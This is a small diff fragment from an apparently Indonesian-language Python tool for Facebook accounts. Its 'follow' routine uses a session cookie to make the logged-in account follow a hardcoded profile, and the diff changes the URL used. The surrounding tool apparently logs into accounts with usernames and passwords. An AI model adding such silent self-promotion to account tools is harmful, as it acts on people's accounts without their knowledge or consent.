@@ -219,7 +219,7 @@ class __xxx__:
             self.__metode__(user, pw, cebok)
 
     def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
+        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
         get = r.find('a', string='Ikuti').get('href')
         session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
